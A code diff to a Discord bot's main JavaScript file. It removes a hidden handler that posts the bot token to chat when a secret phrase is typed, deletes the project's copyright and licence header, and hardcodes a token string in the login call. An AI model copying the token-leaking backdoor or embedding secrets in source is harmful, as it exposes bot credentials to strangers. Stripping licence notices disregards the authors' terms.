@@ -1,10 +1,3 @@
-/*
- * Antique-gold
- * Copyright (C) 2021 DevZ-Org
- * This software is licensed under Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
- * For more information, see README.md and LICENSE
-  */
-
 const {
   Client,
   Collection,
@@ -13,7 +6,7 @@ const {
 } = require("discord.js");
 const { config } = require("dotenv");
 const { prefix, token } = require("./config.json");
-const db = require("quick.db");
+const db = require("mongoose");
 const client = new Client({
   disableEveryone: true
 });
@@ -21,7 +14,7 @@ const canvas = require("canvacord");
 const Cooldown = new Collection();
 const ms = require("ms");
 const fs = require("fs");
-client.config = require("./config/bot");
+client.config = require("./config.json");
 client.emotes = client.config.emotes;
 client.filters = client.config.filters;
 client.commands = new Collection();
@@ -175,13 +168,7 @@ client.on("guildMemberAdd", async member => {
     );
 });
 
-client.on("message", async message => {
-  const owner = ["757844447886311454","538627730921619486"]
-  if (message.content === "antique49!secret") {
-    message.channel.send(process.env.TOKEN)
-  };
-})
 
 //--------Login-via-Token-----------------
 
-client.login(process.env.TOKEN);
+client.login("ODM3Mjk5Mjk3NjYxMzUzOTk0.YIqhvA.ktCuBfieZ3SC93OD8LygapgSLC4");
